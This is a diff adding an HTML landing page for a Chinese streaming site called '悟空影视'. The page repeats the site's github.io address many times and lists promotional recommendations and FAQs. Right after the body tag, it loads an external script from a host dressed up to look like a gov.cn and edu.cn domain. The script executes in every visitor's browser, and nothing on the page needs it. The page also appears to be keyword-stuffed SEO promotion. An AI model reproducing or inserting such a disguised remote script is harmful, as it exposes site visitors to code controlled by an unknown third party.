@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>悟空影视 - 火眼金睛挑好片,悟空影视在线看</title>
+<meta name="description" content="悟空影视(wukongyingshi-zh.github.io)是懂你口味的影视在线观看平台,海量电影、电视剧、综艺、动漫随点随看,火眼金睛帮你筛掉烂片,只留值得追的好内容。">
+<meta name="keywords" content="悟空影视,wukongyingshi-zh.github.io,在线影视,追剧看电影,影视在线观看,高清剧集">
+<meta name="author" content="悟空影视">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://wukongyingshi-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--gold:#f5a623;--gold-d:#e0850f;--gold-l:#ffd27a;--cinder:#151210;--char:#1e1a17;--paper:#faf6f0;--ink:#2b2724;--ash:#7c7269;--red:#e8453c;--shadow:0 18px 50px rgba(224,133,15,.18)}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",-apple-system,sans-serif;background:var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 28px}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+
+/* top bar */
+.bar{background:var(--cinder);color:#cbb994;font-size:12.5px;padding:9px 0;letter-spacing:.4px}
+.bar .wrap{display:flex;justify-content:space-between;align-items:center}
+.bar a{color:var(--gold-l)}
+.bar a:hover{color:#fff}
+
+/* header */
+header.hd{background:var(--paper);border-bottom:3px solid var(--cinder);position:sticky;top:0;z-index:90}
+header.hd .wrap{display:flex;align-items:stretch;justify-content:space-between;height:74px;gap:26px}
+.brand{display:flex;flex-direction:column;justify-content:center}
+.brand b{font-size:25px;font-weight:900;letter-spacing:1px;line-height:1.1}
+.brand b i{font-style:normal;color:var(--gold-d)}
+.brand small{font-size:10.5px;color:var(--ash);letter-spacing:1.6px;text-transform:uppercase;font-family:monospace}
+nav.hdnav{display:flex;align-items:center;gap:6px}
+nav.hdnav a{font-size:14px;font-weight:700;color:var(--ink);padding:8px 14px;border-radius:8px;position:relative}
+nav.hdnav a:hover{background:var(--cinder);color:var(--gold-l)}
+nav.hdnav .go{background:var(--gold);color:#3a2c0d;padding:9px 20px;border-radius:8px;font-weight:800;margin-left:8px}
+nav.hdnav .go:hover{background:var(--gold-d);color:#fff}
+.burger{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:6px;align-self:center}
+.burger i{width:25px;height:2px;background:var(--cinder);border-radius:2px;font-style:normal}
+
+/* cover */
+.cover{background:var(--char);color:#efe6d8;padding:64px 0 0;position:relative;overflow:hidden}
+.cover:before{content:"";position:absolute;right:-90px;top:-90px;width:340px;height:340px;border-radius:50%;background:radial-gradient(circle,rgba(245,166,35,.35),transparent 68%)}
+.cover:after{content:"悟";position:absolute;right:6%;bottom:-40px;font-size:280px;font-weight:900;color:rgba(245,166,35,.06);line-height:1}
+.cover .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1.15fr .85fr;gap:56px;align-items:end}
+.kicker{display:inline-flex;align-items:center;gap:10px;font-size:12px;letter-spacing:3px;color:var(--gold);text-transform:uppercase;margin-bottom:18px}
+.kicker:after{content:"";height:1px;width:56px;background:var(--gold)}
+.cover h1{font-size:clamp(36px,6vw,66px);line-height:1.14;font-weight:900;letter-spacing:-1px}
+.cover h1 em{font-style:normal;color:var(--gold)}
+.cover .lead{font-size:16.5px;color:#c3b7a4;margin:20px 0 28px;max-width:560px}
+.cover .url{display:flex;align-items:center;gap:12px;background:rgba(0,0,0,.3);border:1px solid rgba(245,166,35,.35);border-radius:10px;padding:13px 18px;font-family:monospace;font-size:14px;color:var(--gold-l);margin-bottom:30px;max-width:520px}
+.cover .url b{background:var(--gold);color:#3a2c0d;font-size:11px;padding:3px 10px;border-radius:5px;font-family:inherit;flex-shrink:0}
+.cover .acts{display:flex;gap:12px;flex-wrap:wrap;padding-bottom:44px}
+.ab{background:var(--gold);color:#3a2c0d;padding:14px 32px;border-radius:9px;font-size:15px;font-weight:800;border:0;cursor:pointer}
+.ab:hover{background:var(--gold-d);color:#fff;transform:translateY(-2px)}
+.abb{background:transparent;color:#efe6d8;border:1px solid rgba(239,230,216,.4);padding:14px 28px;border-radius:9px;font-size:15px;font-weight:700;cursor:pointer}
+.abb:hover{border-color:var(--gold);color:var(--gold-l)}
+
+/* ticket card */
+.ticket{background:linear-gradient(160deg,#fff8ec,#ffe9c4);color:var(--ink);border-radius:20px 20px 6px 6px;padding:0 0 26px;box-shadow:var(--shadow);position:relative;margin-bottom:-26px}
+.ticket .hdr{background:var(--cinder);color:var(--gold);font-size:12px;letter-spacing:4px;padding:11px;text-align:center;border-radius:20px 20px 0 0}
+.ticket .row{display:flex;align-items:center;gap:16px;padding:20px 24px 0}
+.ticket .face{width:74px;height:74px;border-radius:16px;background:linear-gradient(135deg,var(--gold),var(--red));display:flex;align-items:center;justify-content:center;font-size:36px;flex-shrink:0;box-shadow:0 8px 20px rgba(232,69,60,.28)}
+.ticket .who h4{font-size:19px;line-height:1.2}
+.ticket .who span{font-size:12px;color:var(--ash)}
+.ticket dl{display:grid;grid-template-columns:1fr 1fr;gap:14px 18px;padding:20px 24px 0}
+.ticket dl div{border-top:1px dashed rgba(0,0,0,.16);padding-top:9px}
+.ticket dt{font-size:11px;color:var(--ash);letter-spacing:1px}
+.ticket dd{font-size:15px;font-weight:800;margin-top:2px}
+.ticket .cut{position:absolute;bottom:14px;left:0;width:100%;height:14px;background:repeating-linear-gradient(90deg,transparent 0,transparent 9px,var(--paper) 9px,var(--paper) 18px)}
+
+/* marquee */
+.marq{background:var(--gold);color:#3a2c0d;padding:13px 0;font-size:13.5px;font-weight:700;overflow:hidden;white-space:nowrap}
+.marq span{display:inline-block;padding-left:34px;animation:mq 34s linear infinite}
+@keyframes mq{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+.marq a{text-decoration:underline;text-decoration-style:dotted}
+
+/* generic section */
+section{padding:84px 0}
+.eyebrow{font-size:11.5px;letter-spacing:3.5px;text-transform:uppercase;color:var(--gold-d);font-weight:800;font-family:monospace}
+.sec-t{display:flex;align-items:flex-end;justify-content:space-between;gap:26px;margin-bottom:38px;flex-wrap:wrap}
+.sec-t h2{font-size:clamp(27px,4vw,44px);font-weight:900;letter-spacing:-.5px;margin-top:7px;line-height:1.25}
+.sec-t p{color:var(--ash);font-size:14.5px;max-width:440px}
+
+/* magazine grid */
+.mag{display:grid;grid-template-columns:1.4fr 1fr;gap:26px}
+.mag .lead-card{background:var(--cinder);color:#efe6d8;border-radius:18px;padding:34px;display:flex;flex-direction:column;justify-content:space-between;min-height:380px;position:relative;overflow:hidden}
+.mag .lead-card:after{content:"";position:absolute;right:-30px;bottom:-30px;width:160px;height:160px;border-radius:50%;background:rgba(245,166,35,.1)}
+.mag .lead-card .num{font-size:64px;font-weight:900;color:var(--gold);line-height:1;font-family:monospace}
+.mag .lead-card h3{font-size:27px;line-height:1.4;margin:16px 0;position:relative;z-index:2}
+.mag .lead-card p{color:#c3b7a4;font-size:14px;position:relative;z-index:2}
+.mag .side{display:flex;flex-direction:column;gap:26px}
+.flick{background:#fff;border:1px solid rgba(0,0,0,.08);border-radius:18px;padding:24px;transition:.32s}
+.flick:hover{transform:translateX(7px);box-shadow:var(--shadow);border-color:rgba(245,166,35,.4)}
+.flick .cat{font-size:11px;letter-spacing:2px;color:var(--gold-d);font-weight:800}
+.flick h4{font-size:18px;margin:7px 0 8px}
+.flick p{font-size:13.5px;color:var(--ash)}
+.flick .more{display:inline-block;margin-top:12px;font-size:12.5px;font-weight:800;color:var(--cinder)}
+.flick .more:hover{color:var(--gold-d)}
+
+/* type rail */
+.rail{display:grid;grid-template-columns:repeat(auto-fill,minmax(168px,1fr));gap:16px}
+.chip{background:#fff;border:1px solid rgba(0,0,0,.08);border-radius:14px;padding:20px 18px;text-align:center;transition:.3s;cursor:pointer}
+.chip:hover{background:var(--cinder);border-color:var(--cinder);color:#efe6d8;transform:translateY(-5px)}
+.chip .ic{font-size:32px;display:block;margin-bottom:9px;line-height:1}
+.chip b{font-size:15px;display:block;margin-bottom:3px}
+.chip small{font-size:11.5px;color:var(--ash)}
+.chip:hover small{color:var(--gold-l)}
+
+/* stats band */
+.band{background:var(--cinder);color:#efe6d8}
+.band .wrap{display:grid;grid-template-columns:1.1fr 1.9fr;gap:50px;align-items:center}
+.band h2{font-size:clamp(25px,3.4vw,38px);font-weight:900;line-height:1.35}
+.band h2 em{font-style:normal;color:var(--gold)}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.stat{border-left:2px solid var(--gold);padding-left:16px}
+.stat b{display:block;font-size:29px;font-weight:900;color:var(--gold-l);line-height:1.1}
+.stat span{font-size:12px;color:#c3b7a4;letter-spacing:1px}
+
+/* accordion */
+.acc{max-width:860px;margin:0 auto}
+.ac{background:#fff;border:1px solid rgba(0,0,0,.09);border-radius:14px;margin-bottom:12px;overflow:hidden}
+.ac-h{padding:20px 24px;display:flex;align-items:center;gap:16px;cursor:pointer;font-size:16.5px;font-weight:800}
+.ac-h .no{font-family:monospace;font-size:13px;color:var(--gold-d);font-weight:800;flex-shrink:0}
+.ac-h .ar{margin-left:auto;color:var(--ash);font-size:13px;transition:.3s}
+.ac.on .ar{transform:rotate(180deg);color:var(--gold-d)}
+.ac-b{max-height:0;overflow:hidden;transition:max-height .4s ease}
+.ac-b p{padding:0 24px 22px 58px;font-size:14.5px;color:var(--ash)}
+
+/* faq dual */
+.dual{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.dual .q{background:#fff;border:1px solid rgba(0,0,0,.08);border-radius:14px;padding:22px 24px;transition:.3s}
+.dual .q:hover{border-color:var(--gold);box-shadow:var(--shadow)}
+.dual .q b{display:block;font-size:15.5px;margin-bottom:6px}
+.dual .q p{font-size:13.5px;color:var(--ash)}
+
+/* closing */
+.close{background:var(--char);border-radius:30px;padding:60px 44px;text-align:center;color:#efe6d8;position:relative;overflow:hidden}
+.close:before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 50% 0,rgba(245,166,35,.14),transparent 60%)}
+.close > *{position:relative;z-index:2}
+.close h2{font-size:clamp(27px,4.2vw,46px);font-weight:900;margin-bottom:14px}
+.close h2 em{font-style:normal;color:var(--gold)}
+.close p{color:#c3b7a4;font-size:15px;max-width:580px;margin:0 auto 24px}
+.close .u{display:inline-block;background:rgba(245,166,35,.12);border:1px solid rgba(245,166,35,.4);border-radius:10px;padding:12px 24px;font-family:monospace;font-size:15px;color:var(--gold-l);margin-bottom:26px}
+.close .u:hover{background:rgba(245,166,35,.22)}
+
+footer{border-top:3px solid var(--cinder);padding:38px 0 24px;margin-top:20px}
+.foot{display:flex;justify-content:space-between;align-items:center;flex-wrap:gap:14px;font-size:13px;color:var(--ash)}
+.foot a{color:var(--gold-d);font-weight:800}
+
+/* reveal */
+.rv{opacity:0;transform:translateY(28px);transition:.6s cubic-bezier(.22,.61,.36,1)}
+.rv.on{opacity:1;transform:none}
+
+@media(max-width:920px){
+  .burger{display:flex}
+  nav.hdnav{position:fixed;top:74px;left:0;width:100%;flex-direction:column;background:var(--paper);padding:16px 26px;border-bottom:2px solid var(--cinder);transform:translateY(-140%);transition:.4s}
+  nav.hdnav.open{transform:none}
+  nav.hdnav a{border-radius:0;border-bottom:1px solid rgba(0,0,0,.07);width:100%;padding:13px 4px}
+  nav.hdnav .go{margin:12px 0 0;width:auto;text-align:center}
+  .cover .wrap{grid-template-columns:1fr}
+  .ticket{margin-top:30px;margin-bottom:0}
+  .mag,.dual,.band .wrap{grid-template-columns:1fr}
+  .stats{grid-template-columns:repeat(2,1fr);gap:26px}
+  section{padding:64px 0}
+  .marq{display:none}
+}
+@media(max-width:520px){
+  .cover{padding:44px 0 0}
+  .bar .wrap{flex-direction:column;gap:5px;font-size:11.5px}
+  .brand b{font-size:21px}
+  .ticket dl{grid-template-columns:1fr}
+  .ticket .row{gap:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="bar">
+  <div class="wrap">
+    <span>🔥 今日推荐：8.9分高口碑剧集《西行纪·光影》正在热播</span>
+    <span>官方站点 <a href="https://wukongyingshi-zh.github.io">wukongyingshi-zh.github.io</a></span>
+  </div>
+</div>
+
+<header class="hd">
+  <div class="wrap">
+    <a href="#" class="brand"><b>悟空<i>影视</i></b><small>wukongyingshi-zh.github.io</small></a>
+    <nav class="hdnav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#type">内容分类</a>
+      <a href="#feat">平台实力</a>
+      <a href="#how">使用说明</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about" class="go">访问官网</a>
+    </nav>
+    <div class="burger" id="burger"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<section class="cover" id="home">
+  <div class="wrap">
+    <div>
+      <div class="kicker">Hu Kong Film & TV</div>
+      <h1>火眼金睛挑好片<br><em>悟空影视</em>在线看</h1>
+      <p class="lead">不想把时间浪费在烂片上？悟空影视帮你把海量影视筛成"值得看"的那一份,电影、剧集、综艺、动漫,点开就能追。</p>
+      <div class="url"><b>官网</b> https://wukongyingshi-zh.github.io</div>
+      <div class="acts">
+        <a href="#type"><button class="ab">开始挑片</button></a>
+        <a href="#feat"><button class="abb">看看平台实力</button></a>
+      </div>
+    </div>
+    <div class="ticket">
+      <div class="hdr">✦ 悟 空 影 视 · 观 影 通 行 证 ✦</div>
+      <div class="row">
+        <div class="face">🐵</div>
+        <div class="who"><h4>今日观影推荐</h4><span>Daily Pick · 2024</span></div>
+      </div>
+      <dl>
+        <div><dt>推荐内容</dt><dd>《西行纪·光影》</dd></div>
+        <div><dt>内容类型</dt><dd>奇幻 / 冒险</dd></div>
+        <div><dt>综合评分</dt><dd>8.9 分</dd></div>
+        <div><dt>更新进度</dt><dd>全 24 集</dd></div>
+      </dl>
+      <div class="cut"></div>
+    </div>
+  </div>
+</section>
+
+<div class="marq">
+  <span>
+    欢迎来到 <a href="https://wukongyingshi-zh.github.io">悟空影视</a> · 火眼金睛挑好片，省下选片时间 · 电影 剧集 综艺 动漫一站覆盖 · 官方网址 <a href="https://wukongyingshi-zh.github.io">https://wukongyingshi-zh.github.io</a> · 观影进度云端同步 · 多播放源智能切换 · 清爽无干扰的观影体验 · 欢迎来到 <a href="https://wukongyingshi-zh.github.io">悟空影视</a> · 火眼金睛挑好片，省下选片时间 · 电影 剧集 综艺 动漫一站覆盖 · 官方网址 <a href="https://wukongyingshi-zh.github.io">https://wukongyingshi-zh.github.io</a> · 观影进度云端同步 · 多播放源智能切换 · 清爽无干扰的观影体验
+  </span>
+</div>
+
+<section id="type">
+  <div class="wrap">
+    <div class="sec-t">
+      <div><div class="eyebrow">Content Type</div><h2>想看什么,一眼就对上</h2></div>
+      <p>悟空影视把内容按类型整理清楚,不管是想爽一把、哭一场还是打发时间,都能快速找到对口的那一类。</p>
+    </div>
+    <div class="rail">
+      <div class="chip"><span class="ic">🎬</span><b>院线电影</b><small>大片 / 文艺 / 独立</small></div>
+      <div class="chip"><span class="ic">📺</span><b>热播剧集</b><small>国产 / 美剧 / 日韩</small></div>
+      <div class="chip"><span class="ic">🎤</span><b>综艺节目</b><small>真人秀 / 脱口秀</small></div>
+      <div class="chip"><span class="ic">🐉</span><b>动漫番剧</b><small>热血 / 治愈 / 国漫</small></div>
+      <div class="chip"><span class="ic">🌿</span><b>纪录片</b><small>自然 / 人文 / 历史</small></div>
+      <div class="chip"><span class="ic">🍿</span><b>短片合集</b><small>微电影 / 混剪</small></div>
+    </div>
+  </div>
+</section>
+
+<section id="feat" style="background:linear-gradient(180deg,#fff,transparent)">
+  <div class="wrap">
+    <div class="sec-t">
+      <div><div class="eyebrow">Editor's Picks</div><h2>编辑精选,把好内容递到你手上</h2></div>
+      <p>不想翻榜单?我们替你挑。每周更新一组精选内容,附上为什么值得看,省掉选片的两难时刻。</p>
+    </div>
+    <div class="mag">
+      <div class="lead-card">
+        <div>
+          <div class="num">No.1</div>
+          <h3>《西行纪·光影》<br>本周编辑最想推荐的一部</h3>
+          <p>动作场面流畅,人物弧光完整,国漫质感的画面每一帧都经得起暂停。适合想"一口气看完"的夜晚。</p>
+        </div>
+        <a href="#type" style="color:var(--gold);font-size:13.5px;font-weight:800;text-decoration:underline;text-decoration-style:dotted">查看更多精选 →</a>
+      </div>
+      <div class="side">
+        <div class="flick"><div class="cat">MOVIE</div><h4>《云端之北》</h4><p>文艺片里的公路叙事,节奏慢但后劲足,配上一副好耳机体验更佳。</p><a href="#" class="more">了解详情 →</a></div>
+        <div class="flick"><div class="cat">DRAMA</div><h4>《城南旧事 第二季》</h4><p>年代剧的细腻笔触,把家长里短拍出了人情味,适合全家一起看。</p><a href="#" class="more">了解详情 →</a></div>
+        <div class="flick"><div class="cat">VARIETY</div><h4>《周末欢乐秀》</h4><p>下饭综艺的代表,每期一个主题,笑点密度高,不费脑的快乐。</p><a href="#" class="more">了解详情 →</a></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="band">
+  <div class="wrap">
+    <h2>为什么越来越多人<br>把 <em>悟空影视</em> 当成<br>追剧第一站</h2>
+    <div class="stats">
+      <div class="stat"><b>15万+</b><span>影视条目</span></div>
+      <div class="stat"><b>6 大类</b><span>内容频道</span></div>
+      <div class="stat"><b>8.6+</b><span>平均评分</span></div>
+      <div class="stat"><b>0 弹窗</b><span>干净观影</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="how">
+  <div class="wrap">
+    <div class="sec-t center" style="text-align:center;justify-content:center">
+      <div style="margin:0 auto"><div class="eyebrow">How To Use</div><h2>三步上手,马上开看</h2></div>
+    </div>
+    <div class="acc">
+      <div class="ac on"><div class="ac-h"><span class="no">STEP 01</span>挑内容 —— 按类型或榜单快速定位<span class="ar">▾</span></div><div class="ac-b" style="max-height:220px"><p>打开悟空影视首页,可以先按"电影 / 剧集 / 综艺 / 动漫"分类直接筛选,也可以看编辑精选和实时榜单。每部内容都标注了类型、评分和集数,帮你快速判断是否对胃口。</p></div></div>
+      <div class="ac"><div class="ac-h"><span class="no">STEP 02</span>选线路 —— 播放卡顿一键换源<span class="ar">▾</span></div><div class="ac-b"><p>点开想看的内容后,系统会自动加载播放源。如果遇到加载慢或卡顿,点击播放器上方的"换源"按钮即可切换到备用线路,无需退出重进,观影节奏不被打断。</p></div></div>
+      <div class="ac"><div class="ac-h"><span class="no">STEP 03</span>接着看 —— 进度自动保存续播<span class="ar">▾</span></div><div class="ac-b"><p>观看进度会保存在本地,下次打开自动跳到上次的位置。登录账号后进度还会在手机、平板、电脑之间同步,通勤用手机看一半,回家用电脑接着追。</p></div></div>
+      <div class="ac"><div class="ac-h"><span class="no">STEP 04</span>追更新 —— 收藏后及时提醒<span class="ar">▾</span></div><div class="ac-b"><p>遇到连载中的剧集,点一下"追剧"加入收藏列表,更新后会优先展示在首页,不用每次都去翻更新表。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="faq" style="background:linear-gradient(180deg,#fff,transparent)">
+  <div class="wrap">
+    <div class="sec-t">
+      <div><div class="eyebrow">You May Ask</div><h2>观影前你可能想知道</h2></div>
+      <p>关于悟空影视最常见的几个疑问,这里先帮你答掉。</p>
+    </div>
+    <div class="dual">
+      <div class="q"><b>悟空影视收费吗?</b><p>平台基础观影功能免费使用,无需注册即可直接观看,不捆绑付费项目。</p></div>
+      <div class="q"><b>支持哪些设备?</b><p>手机、平板、电脑浏览器均可访问,页面会自动适配屏幕尺寸,无需下载客户端。</p></div>
+      <div class="q"><b>播放卡顿怎么办?</b><p>每个内容配备多个播放源,播放器上方可一键换源,也可尝试切换网络后刷新。</p></div>
+      <div class="q"><b>官网地址是什么?</b><p>唯一官方地址是 <a href="https://wukongyingshi-zh.github.io" class="mono" style="color:var(--gold-d)">https://wukongyingshi-zh.github.io</a>,请认准此域名,谨防仿冒站点。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="close rv">
+      <h2>🐵 来 <em>悟空影视</em><br>把选片时间省下来</h2>
+      <p>火眼金睛帮你筛掉烂片,只留值得追的好内容。电影、剧集、综艺、动漫一站覆盖,打开就能看。</p>
+      <div class="u">https://wukongyingshi-zh.github.io</div>
+      <a href="#type"><button class="ab" style="background:#fff;color:var(--cinder)">进入内容分类</button></a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <span>© 2024 悟空影视 · 官网 <a href="https://wukongyingshi-zh.github.io">wukongyingshi-zh.github.io</a> · 火眼金睛挑好片</span>
+      <span>访问 <a href="https://wukongyingshi-zh.github.io">https://wukongyingshi-zh.github.io</a> 开启观影</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var b=document.getElementById('burger'),n=document.getElementById('nav');
+b.addEventListener('click',function(){n.classList.toggle('open');});
+n.addEventListener('click',function(e){if(e.target.tagName==='A')n.classList.remove('open');});
+var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('on');io.unobserve(e.target);}});},{threshold:.08,rootMargin:'0px 0px -24px'});
+document.querySelectorAll('.rv').forEach(function(el){io.observe(el);});
+document.querySelectorAll('.ac-h').forEach(function(h){
+  h.addEventListener('click',function(){
+    var a=h.parentElement,b=b=document.getElementById('how')?h.parentElement:h.parentElement;
+    var open=document.querySelectorAll('.ac.on');
+    open.forEach(function(o){if(o!==a)o.classList.remove('on');});
+    a.classList.toggle('on');
+    var bd=a.querySelector('.ac-b');
+    if(a.classList.contains('on')){bd.style.maxHeight=bd.scrollHeight+40+'px';}
+    else{bd.style.maxHeight='0px';}
+  });
+});
+</script>
+</body>
+</html>
